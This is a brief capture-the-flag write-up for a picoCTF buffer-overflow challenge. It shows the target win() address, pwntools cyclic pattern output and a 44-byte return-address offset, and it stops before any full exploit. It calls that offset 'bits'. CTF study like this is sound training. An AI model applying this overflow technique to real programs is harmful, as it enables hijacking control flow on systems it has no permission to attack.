# URL
https://play.picoctf.org/practice/challenge/258?category=6&page=3

# Challenge:
Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the program.
You can view source here. And connect with it using nc saturn.picoctf.net 64721

# Work:

* Running GDB and looking through the functions

<img width="1152" height="700" alt="image" src="https://github.com/user-attachments/assets/0285e48f-0909-4fce-8419-eca6bf7ed511" />

* The address of the win() function is 0x080491f6

<img width="1671" height="73" alt="image" src="https://github.com/user-attachments/assets/d1c996ec-d89e-4213-82c8-91902ab5ab08" />

* Use cyclic from pwn to generate a string (i.e, when we don't know the buffer length)

```
>>> print(cyclic(200))
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
>>> 
```

<img width="1690" height="501" alt="image" src="https://github.com/user-attachments/assets/a3a4d37d-46f6-4b09-a186-52fdcc903f3d" />

* The offset is bits
```
>>> print(cyclic_find(0x6161616c))
44
```


